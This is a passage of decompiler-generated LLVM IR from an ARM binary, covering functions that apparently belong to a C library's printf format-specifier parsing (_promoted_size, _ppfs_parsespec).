  store i32 %v0_10bf8, i32* %v3_10bf8, align 4
  %v2_10bfc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10bfc, i32* @r4, align 4
  %v8_10bfc = load i32, i32* @r0, align 4
  ret i32 %v8_10bfc

; uselistorder directives
  uselistorder i32 %v1_10b90, { 2, 1, 0 }
  uselistorder i32 %v0_10b94, { 1, 2, 0 }
  uselistorder i32 %v3_10b64, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10adc, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_10adc, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_10ad0, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_10acc24, { 1, 0 }
  uselistorder i32 %v0_10b9418, { 2, 0, 1 }
  uselistorder i32 %v0_10a68, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10ba0, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_10b90, { 1, 0 }
  uselistorder label %dec_label_pc_10b8c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10b7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10b64, { 1, 0 }
  uselistorder label %dec_label_pc_10b50, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_10acc, { 1, 0 }
  uselistorder label %dec_label_pc_10ac4, { 1, 0 }
  uselistorder label %dec_label_pc_10aa0, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10c1c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c08

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10c24, %entry
  %v0_10c08 = phi i32 [ %v1_10c08, %dec_label_pc_10c24 ], [ ptrtoint (i32* @global_var_1a140.642 to i32), %entry ]
  %v1_10c08 = add i32 %v0_10c08, -2
  %v1_10c0c = add i32 %v0_10c08, -1
  %v2_10c0c = inttoptr i32 %v1_10c0c to i8*
  %v3_10c0c = load i8, i8* %v2_10c0c, align 1
  %v4_10c0c = zext i8 %v3_10c0c to i32
  %v1_10c10 = inttoptr i32 %v1_10c08 to i8*
  %v2_10c10 = load i8, i8* %v1_10c10, align 2
  %v3_10c10 = zext i8 %v2_10c10 to i32
  %v3_10c14 = mul nuw i32 %v4_10c0c, 16777216
  %v4_10c18 = sdiv i32 %v3_10c14, 65536
  %v5_10c18 = or i32 %v4_10c18, %v3_10c10
  %v9_10c1c = icmp eq i32 %v5_10c18, %v1_10c1c.pre
  br i1 %v9_10c1c, label %dec_label_pc_10c08.dec_label_pc_10c30_crit_edge, label %dec_label_pc_10c24

dec_label_pc_10c08.dec_label_pc_10c30_crit_edge:  ; preds = %dec_label_pc_10c08
  br label %dec_label_pc_10c30

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c08
  %tmp = icmp ugt i32 %v1_10c08, ptrtoint (i32* @global_var_1a128.644 to i32)
  br i1 %tmp, label %dec_label_pc_10c08, label %dec_label_pc_10c30

dec_label_pc_10c30:                               ; preds = %dec_label_pc_10c24, %dec_label_pc_10c08.dec_label_pc_10c30_crit_edge
  %v2_10c38.pre-phi = sub i32 %v1_10c08, ptrtoint (i32* @global_var_1a128.644 to i32)
  store i32 ptrtoint (i32* @global_var_1a140.642 to i32), i32* @r2, align 4
  %v4_10c3c = sdiv i32 %v2_10c38.pre-phi, 2
  %v5_10c3c = add i32 %v4_10c3c, ptrtoint (i32* @global_var_1a140.642 to i32)
  %v6_10c3c = inttoptr i32 %v5_10c3c to i8*
  %v7_10c3c = load i8, i8* %v6_10c3c, align 1
  %v9_10c3c = zext i8 %v7_10c3c to i32
  ret i32 %v9_10c3c

; uselistorder directives
  uselistorder i32 %v1_10c08, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10c08, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a140.642 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10c50 = load i32, i32* @r4, align 4
  store i32 %v3_10c50, i32* %stack_var_-32, align 4
  %v6_10c50 = load i32, i32* @r5, align 4
  %v25_10c50 = ptrtoint i32* %stack_var_-32 to i32
  %v1_10c54 = add i32 %tmp, 16
  %v2_10c54 = inttoptr i32 %v1_10c54 to i32*
  %v3_10c54 = load i32, i32* %v2_10c54, align 4
  %v2_10c58 = ptrtoint i32* %stack_var_-88 to i32
  %v1_10c5c = and i32 %v3_10c54, 128
  store i32 %v1_10c5c, i32* @r4, align 4
  %v2_10c5c = icmp eq i32 %v1_10c5c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_10c7c = add i32 %tmp, 24
  %v2_10c7c = inttoptr i32 %v1_10c7c to i32*
  %v3_10c7c = load i32, i32* %v2_10c7c, align 4
  store i32 %v3_10c7c, i32* %sb.global-to-local, align 4
  br i1 %v2_10c5c, label %bb, label %dec_label_pc_10c9c

bb:                                               ; preds = %entry
  %v3_10c80 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10e6c
  %v0_10c8c = load i32, i32* %r0.global-to-local, align 4
  %v0_10e9c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e94

dec_label_pc_10c94:                               ; preds = %dec_label_pc_10e98
  %v1_10c94 = add i32 %v0_10e9c.pre, 1
  store i32 %v1_10c94, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10eb4

dec_label_pc_10c9c:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ca0

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10cd4.dec_label_pc_10ca0_crit_edge, %dec_label_pc_10c9c
  %v1_10cb0 = phi i32 [ %v1_10cc4, %dec_label_pc_10cd4.dec_label_pc_10ca0_crit_edge ], [ 0, %dec_label_pc_10c9c ]
  %v0_10ca0 = phi i32 [ %v0_10ca0.pre, %dec_label_pc_10cd4.dec_label_pc_10ca0_crit_edge ], [ %tmp, %dec_label_pc_10c9c ]
  %v1_10ca0 = inttoptr i32 %v0_10ca0 to i32*
  %v2_10ca0 = load i32, i32* %v1_10ca0, align 4
  %v4_10ca4 = mul i32 %v1_10cb0, 4
  %v5_10ca4 = add i32 %v2_10ca0, %v4_10ca4
  store i32 %v5_10ca4, i32* %r3.global-to-local, align 4
  %v1_10ca8 = add i32 %v5_10ca4, -4
  %v2_10ca8 = inttoptr i32 %v1_10ca8 to i32*
  %v3_10ca8 = load i32, i32* %v2_10ca8, align 4
  store i32 %v3_10ca8, i32* %r1.global-to-local, align 4
  store i32 %v25_10c50, i32* @ip, align 4
  %v2_10cb0 = add i32 %v1_10cb0, %v25_10c50
  store i32 %v2_10cb0, i32* %r2.global-to-local, align 4
  %v1_10cb4 = trunc i32 %v3_10ca8 to i8
  %v3_10cb4 = add i32 %v2_10cb0, -56
  %v4_10cb4 = inttoptr i32 %v3_10cb4 to i8*
  store i8 %v1_10cb4, i8* %v4_10cb4, align 1
  %v0_10cb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10cb8 = add i32 %v0_10cb8, -56
  %v2_10cb8 = inttoptr i32 %v1_10cb8 to i8*
  %v3_10cb8 = load i8, i8* %v2_10cb8, align 1
  %v4_10cb8 = zext i8 %v3_10cb8 to i32
  store i32 %v4_10cb8, i32* %r2.global-to-local, align 4
  %v0_10cbc = load i32, i32* %r3.global-to-local, align 4
  %v1_10cbc = add i32 %v0_10cbc, -4
  %v2_10cbc = inttoptr i32 %v1_10cbc to i32*
  %v3_10cbc = load i32, i32* %v2_10cbc, align 4
  store i32 %v3_10cbc, i32* %r3.global-to-local, align 4
  %v9_10cc0 = icmp eq i32 %v4_10cb8, %v3_10cbc
  %v0_10cc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10cc4 = add i32 %v0_10cc4, 1
  store i32 %v1_10cc4, i32* %r0.global-to-local, align 4
  br i1 %v9_10cc0, label %dec_label_pc_10ccc, label %dec_label_pc_110e4

dec_label_pc_10ccc:                               ; preds = %dec_label_pc_10ca0
  %v2_10ccc = icmp eq i8 %v3_10cb8, 0
  br i1 %v2_10ccc, label %dec_label_pc_10cdc, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10ccc
  %tmp166 = icmp ult i32 %v1_10cc4, 32
  br i1 %tmp166, label %dec_label_pc_10cd4.dec_label_pc_10ca0_crit_edge, label %dec_label_pc_10cdc

dec_label_pc_10cd4.dec_label_pc_10ca0_crit_edge:  ; preds = %dec_label_pc_10cd4
  %v0_10ca0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10ca0

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10ccc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10ce4 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %bb, %dec_label_pc_10cdc
  %storemerge102 = phi i32 [ %v2_10ce4, %dec_label_pc_10cdc ], [ %v3_10c80, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_10cf8

dec_label_pc_10cf4:                               ; preds = %.thread22, %dec_label_pc_10e04
  %v0_10cf4 = phi i32 [ %v2_10e7c, %.thread22 ], [ %storemerge105, %dec_label_pc_10e04 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_10e04 ]
  store i32 %v0_10cf4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10cf8

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10ce8, %dec_label_pc_10cf4
  %v1_10d14 = phi i32 [ %storemerge102, %dec_label_pc_10ce8 ], [ %v0_10cf4, %dec_label_pc_10cf4 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_10ce8 ], [ %stack_var_-48.0, %dec_label_pc_10cf4 ]
  %v1_10cf8 = inttoptr i32 %v1_10d14 to i8*
  %v2_10cf8 = load i8, i8* %v1_10cf8, align 1
  %v3_10cf8 = zext i8 %v2_10cf8 to i32
  store i32 %v3_10cf8, i32* %r3.global-to-local, align 4
  %v7_10cfc = icmp eq i8 %v2_10cf8, 42
  br i1 %v7_10cfc, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_10cf8
  store i32 %v1_10d14, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_10cf8
  %v1_10d08 = load i32, i32* @lr, align 4
  %v4_10d08 = mul i32 %v1_10d08, -4
  %v5_10d08 = add i32 %v4_10d08, %v25_10c50
  store i32 %v5_10d08, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10d14 = add i32 %v1_10d14, 1
  store i32 %v2_10d14, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10d1c = add i32 %v5_10d08, -12
  %v4_10d1c = inttoptr i32 %v3_10d1c to i32*
  store i32 0, i32* %v4_10d1c, align 4
  %v0_10d40.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_10d40.pre = phi i32 [ %v0_10d40.pre.pre, %bb124 ], [ %v1_10d14, %.thread9.thread ]
  %v2_10d44.pre = load i32, i32* @global_var_237ac, align 4
  br label %.backedge

dec_label_pc_10d24:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_10d28 = load i32, i32* %r0.global-to-local, align 4
  %v7_10d2c = icmp sgt i32 %v0_10d28, 4094
  br i1 %v7_10d2c, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_10d24
  %v1_10d3414 = add i32 %v0_10db8, 1
  store i32 %v1_10d3414, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_10d24
  %v11_10d30 = mul i32 %v0_10d28, 10
  %v12_10d30 = add i32 %v11_10d30, %v3_10d40
  store i32 %v12_10d30, i32* %r3.global-to-local, align 4
  %v1_10d34 = add i32 %v0_10db8, 1
  store i32 %v1_10d34, i32* %r6.global-to-local, align 4
  %v9_10d38 = add i32 %v12_10d30, -48
  store i32 %v9_10d38, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_10db8 = phi i32 [ %v0_10d40.pre, %.preheader ], [ %v1_10d34, %bb126 ], [ %v1_10d3414, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_237ac to i32), i32* %r3.global-to-local, align 4
  %v1_10d40 = inttoptr i32 %v0_10db8 to i8*
  %v2_10d40 = load i8, i8* %v1_10d40, align 1
  %v3_10d40 = zext i8 %v2_10d40 to i32
  store i32 %v3_10d40, i32* %r2.global-to-local, align 4
  store i32 %v2_10d44.pre, i32* %r3.global-to-local, align 4
  %v3_10d48 = mul nuw nsw i32 %v3_10d40, 2
  %v4_10d48 = add i32 %v3_10d48, %v2_10d44.pre
  %v5_10d48 = inttoptr i32 %v4_10d48 to i8*
  %v6_10d48 = load i8, i8* %v5_10d48, align 1
  %v8_10d48 = zext i8 %v6_10d48 to i32
  store i32 %v8_10d48, i32* %r3.global-to-local, align 4
  %v1_10d4c = and i32 %v8_10d48, 8
  %v2_10d4c = icmp eq i32 %v1_10d4c, 0
  br i1 %v2_10d4c, label %dec_label_pc_10d54, label %dec_label_pc_10d24

dec_label_pc_10d54:                               ; preds = %.backedge
  %v0_10d54 = load i32, i32* %r1.global-to-local, align 4
  %v1_10d54 = add i32 %v0_10d54, -1
  %v2_10d54 = inttoptr i32 %v1_10d54 to i8*
  %v3_10d54 = load i8, i8* %v2_10d54, align 1
  %v4_10d54 = zext i8 %v3_10d54 to i32
  store i32 %v4_10d54, i32* %r3.global-to-local, align 4
  %v7_10d58 = icmp eq i8 %v3_10d54, 37
  br i1 %v7_10d58, label %dec_label_pc_10d60, label %dec_label_pc_10e1c

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d54
  %v7_10d60 = icmp eq i8 %v2_10d40, 36
  %. = zext i1 %v7_10d60 to i32
  store i32 %., i32* @ip, align 4
  %v0_10d6c = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_10d6c, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_10d60
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10d60, %bb130
  %v1_10dc8 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_10d60 ]
  %v2_10d74 = icmp eq i32 %v1_10dc8, 0
  %v0_10da4 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_10d74, label %dec_label_pc_10da4, label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %thread-pre-split
  %v2_10da4 = icmp eq i32 %v0_10da4, 0
  %v1_10d80 = add i32 %v0_10db8, 1
  store i32 %v1_10d80, i32* %r1.global-to-local, align 4
  br i1 %v2_10da4, label %dec_label_pc_110e4, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d7c
  %v2_10d88 = sub i32 %v0_10d6c, %v0_10da4
  %v4_10d88 = xor i32 %v0_10da4, %v0_10d6c
  %v5_10d88 = xor i32 %v2_10d88, %v0_10d6c
  %v6_10d88 = and i32 %v5_10d88, %v4_10d88
  %v7_10d88 = icmp slt i32 %v6_10d88, 0
  %v8_10d88 = icmp slt i32 %v2_10d88, 0
  %v9_10d88 = icmp eq i32 %v0_10d6c, %v0_10da4
  %v3_10d8c = xor i1 %v8_10d88, %v7_10d88
  %v4_10d8c = or i1 %v9_10d88, %v3_10d8c
  br i1 %v4_10d8c, label %dec_label_pc_10d9c, label %bb131

bb131:                                            ; preds = %dec_label_pc_10d88
  store i32 %v0_10d6c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10db8, %dec_label_pc_10dc0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %bb131, %dec_label_pc_10d88, %dec_label_pc_10d98
  %v0_10d9c = phi i32 [ %v0_10d54, %dec_label_pc_10d98 ], [ %v1_10d80, %dec_label_pc_10d88 ], [ %v1_10d80, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_10d98 ], [ %v0_10d6c, %dec_label_pc_10d88 ], [ %v0_10d6c, %bb131 ]
  br label %dec_label_pc_10dd4

dec_label_pc_10da4:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_10da4, 1
  br i1 %tmp132, label %dec_label_pc_10db8, label %dec_label_pc_10dac

dec_label_pc_10dac:                               ; preds = %dec_label_pc_10da4
  %v7_10dac = icmp eq i8 %v2_10d40, 109
  br i1 %v7_10dac, label %dec_label_pc_10e1c, label %dec_label_pc_110e4

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10da4
  %tmp167 = icmp ugt i32 %v0_10db8, %v0_10d54
  br i1 %tmp167, label %dec_label_pc_10dc0, label %dec_label_pc_10d98

dec_label_pc_10dc0:                               ; preds = %dec_label_pc_10db8
  %v1_10dc0 = inttoptr i32 %v0_10d54 to i8*
  %v2_10dc0 = load i8, i8* %v1_10dc0, align 1
  %v3_10dc0 = zext i8 %v2_10dc0 to i32
  store i32 %v3_10dc0, i32* %r3.global-to-local, align 4
  %v7_10dc4 = icmp eq i8 %v2_10dc0, 48
  br i1 %v7_10dc4, label %dec_label_pc_10d98, label %bb133

bb133:                                            ; preds = %dec_label_pc_10dc0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10e1c

dec_label_pc_10dd4.loopexit:                      ; preds = %dec_label_pc_10ddc
  %v1_10de8 = load i32, i32* @r4, align 4
  %v3_10de8 = or i32 %v1_10de8, %v0_10dfc
  store i32 %v3_10de8, i32* @r4, align 4
  %v2_10dec = add i32 %storemerge105, 1
  br label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10dd4.loopexit, %dec_label_pc_10d9c
  %storemerge105 = phi i32 [ %v0_10d9c, %dec_label_pc_10d9c ], [ %v2_10dec, %dec_label_pc_10dd4.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a120.649 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10de0 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10df4, %dec_label_pc_10dd4
  %v0_10dfc = phi i32 [ %v2_10dfc, %dec_label_pc_10df4 ], [ 1, %dec_label_pc_10dd4 ]
  %v0_10ddc = phi i32 [ %v5_10ddc, %dec_label_pc_10df4 ], [ ptrtoint ([8 x i8]* @global_var_1a120.649 to i32), %dec_label_pc_10dd4 ]
  %v1_10ddc = inttoptr i32 %v0_10ddc to i8*
  %v2_10ddc = load i8, i8* %v1_10ddc, align 1
  %v3_10ddc = zext i8 %v2_10ddc to i32
  store i32 %v3_10ddc, i32* %r2.global-to-local, align 4
  %v5_10ddc = add i32 %v0_10ddc, 1
  store i32 %v5_10ddc, i32* %r1.global-to-local, align 4
  %v2_10de0 = load i8, i8* %v1_10de0, align 1
  %v3_10de0 = zext i8 %v2_10de0 to i32
  store i32 %v3_10de0, i32* %r3.global-to-local, align 4
  %v9_10de4 = icmp eq i8 %v2_10de0, %v2_10ddc
  br i1 %v9_10de4, label %dec_label_pc_10dd4.loopexit, label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10ddc
  %v1_10df4 = inttoptr i32 %v5_10ddc to i8*
  %v2_10df4 = load i8, i8* %v1_10df4, align 1
  %v3_10df4 = zext i8 %v2_10df4 to i32
  store i32 %v3_10df4, i32* %r3.global-to-local, align 4
  %v2_10df8 = icmp eq i8 %v2_10df4, 0
  %v2_10dfc = mul i32 %v0_10dfc, 2
  store i32 %v2_10dfc, i32* %r0.global-to-local, align 4
  br i1 %v2_10df8, label %dec_label_pc_10e04, label %dec_label_pc_10ddc

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10df4
  %v1_10e04 = add i32 %storemerge105, -1
  %v2_10e04 = inttoptr i32 %v1_10e04 to i8*
  %v3_10e04 = load i8, i8* %v2_10e04, align 1
  %v7_10e08 = icmp eq i8 %v3_10e04, 37
  %v0_10e0c = load i32, i32* @r4, align 4
  %v1_10e0c = and i32 %v0_10e0c, 10
  store i32 %v1_10e0c, i32* %r3.global-to-local, align 4
  %v4_10e10 = udiv i32 %v1_10e0c, 2
  %v5_10e10 = sub nuw nsw i32 -1, %v4_10e10
  %v6_10e10 = and i32 %v0_10e0c, %v5_10e10
  store i32 %v6_10e10, i32* @r4, align 4
  br i1 %v7_10e08, label %dec_label_pc_10e18, label %dec_label_pc_10cf4

dec_label_pc_10e18:                               ; preds = %dec_label_pc_10e04
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %bb133, %dec_label_pc_10d54, %dec_label_pc_10dac, %dec_label_pc_10e18
  %v1_10e60 = phi i32 [ %storemerge105, %dec_label_pc_10e18 ], [ %v0_10db8, %bb133 ], [ %v0_10db8, %dec_label_pc_10dac ], [ %v0_10db8, %dec_label_pc_10d54 ]
  %v0_10e5c = phi i32 [ %v5_10ddc, %dec_label_pc_10e18 ], [ %v0_10d54, %bb133 ], [ %v0_10d54, %dec_label_pc_10dac ], [ %v0_10d54, %dec_label_pc_10d54 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_10e18 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_10dac ], [ %stack_var_-48.1, %dec_label_pc_10d54 ]
  %v1_10e1c = inttoptr i32 %v0_10e5c to i8*
  %v2_10e1c = load i8, i8* %v1_10e1c, align 1
  %v3_10e1c = zext i8 %v2_10e1c to i32
  store i32 %v3_10e1c, i32* %r3.global-to-local, align 4
  %v7_10e20 = icmp eq i8 %v2_10e1c, 42
  br i1 %v7_10e20, label %dec_label_pc_10e28, label %dec_label_pc_10e6c

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e1c
  %v0_10e28 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e28 = icmp eq i32 %v0_10e28, 0
  br i1 %v2_10e28, label %dec_label_pc_10e5c, label %dec_label_pc_10e30

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e28
  %v1_10e30 = inttoptr i32 %v1_10e60 to i8*
  %v2_10e30 = load i8, i8* %v1_10e30, align 1
  %v3_10e30 = zext i8 %v2_10e30 to i32
  store i32 %v3_10e30, i32* %r3.global-to-local, align 4
  %v7_10e34 = icmp eq i8 %v2_10e30, 36
  br i1 %v7_10e34, label %dec_label_pc_10e3c, label %dec_label_pc_110e4

dec_label_pc_10e3c:                               ; preds = %dec_label_pc_10e30
  %v0_10e3c = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_10e3c, 1
  br i1 %tmp134, label %dec_label_pc_110e4, label %dec_label_pc_10e44

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e3c
  store i32 %v25_10c50, i32* %r1.global-to-local, align 4
  %v0_10e4c = load i32, i32* @lr, align 4
  %v3_10e4c = mul i32 %v0_10e4c, -4
  %v4_10e4c = add i32 %v3_10e4c, %v25_10c50
  store i32 %v4_10e4c, i32* %r3.global-to-local, align 4
  %v1_10e50 = add i32 %v1_10e60, 1
  store i32 %v1_10e50, i32* %r6.global-to-local, align 4
  %v2_10e54 = add i32 %v4_10e4c, -24
  %v3_10e54 = inttoptr i32 %v2_10e54 to i32*
  store i32 %v0_10e3c, i32* %v3_10e54, align 4
  br label %dec_label_pc_10e68

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e28
  %v1_10e5c = add i32 %v0_10e5c, 1
  store i32 %v1_10e5c, i32* %r3.global-to-local, align 4
  %v9_10e60 = icmp eq i32 %v1_10e5c, %v1_10e60
  br i1 %v9_10e60, label %dec_label_pc_10e68, label %dec_label_pc_110e4

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e5c, %dec_label_pc_10e44
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e1c, %dec_label_pc_10e68
  %v0_10e6c = load i32, i32* @lr, align 4
  %v2_10e6c = icmp eq i32 %v0_10e6c, 0
  br i1 %v2_10e6c, label %dec_label_pc_10e74, label %dec_label_pc_10c8c

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e6c
  %v0_10e74 = load i32, i32* %r6.global-to-local, align 4
  %v1_10e74 = inttoptr i32 %v0_10e74 to i8*
  %v2_10e74 = load i8, i8* %v1_10e74, align 1
  %v3_10e74 = zext i8 %v2_10e74 to i32
  store i32 %v3_10e74, i32* %r3.global-to-local, align 4
  %v7_10e78 = icmp eq i8 %v2_10e74, 46
  br i1 %v7_10e78, label %.thread22, label %dec_label_pc_10e8c

.thread22:                                        ; preds = %dec_label_pc_10e74
  %v2_10e7c = add i32 %v0_10e74, 1
  store i32 %v2_10e7c, i32* %r6.global-to-local, align 4
  %v1_10e80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_10e80, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_10cf4

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e74
  %v0_10e8c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10e8c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10e94

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10c8c, %dec_label_pc_10e8c
  %v0_10e9c.pre = phi i32 [ %v0_10e74, %dec_label_pc_10e8c ], [ %v0_10e9c.pre.pre, %dec_label_pc_10c8c ]
  %storemerge = phi i32 [ -1, %dec_label_pc_10e8c ], [ %v0_10c8c, %dec_label_pc_10c8c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a0c8.651 to i32), i32* %r1.global-to-local, align 4
  %v1_10e9c = inttoptr i32 %v0_10e9c.pre to i8*
  br label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %dec_label_pc_10ea8, %dec_label_pc_10e94
  %v0_10ea8 = phi i32 [ %v1_10ea8, %dec_label_pc_10ea8 ], [ ptrtoint ([9 x i8]* @global_var_1a0c8.651 to i32), %dec_label_pc_10e94 ]
  %v1_10e98 = inttoptr i32 %v0_10ea8 to i8*
  %v2_10e98 = load i8, i8* %v1_10e98, align 1
  %v3_10e98 = zext i8 %v2_10e98 to i32
  store i32 %v3_10e98, i32* %r2.global-to-local, align 4
  %v2_10e9c = load i8, i8* %v1_10e9c, align 1
  %v3_10e9c = zext i8 %v2_10e9c to i32
  store i32 %v3_10e9c, i32* %r3.global-to-local, align 4
  %v9_10ea0 = icmp eq i8 %v2_10e9c, %v2_10e98
  br i1 %v9_10ea0, label %dec_label_pc_10c94, label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e98
  %v1_10ea8 = add i32 %v0_10ea8, 1
  %v2_10ea8 = inttoptr i32 %v1_10ea8 to i8*
  %v3_10ea8 = load i8, i8* %v2_10ea8, align 1
  %v4_10ea8 = zext i8 %v3_10ea8 to i32
  store i32 %v4_10ea8, i32* %r3.global-to-local, align 4
  store i32 %v1_10ea8, i32* %r1.global-to-local, align 4
  %v2_10eac = icmp eq i8 %v3_10ea8, 0
  br i1 %v2_10eac, label %dec_label_pc_10eb4, label %dec_label_pc_10e98

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10ea8, %dec_label_pc_10c94
  %v1_10ed4 = phi i32 [ %v1_10c94, %dec_label_pc_10c94 ], [ %v0_10e9c.pre, %dec_label_pc_10ea8 ]
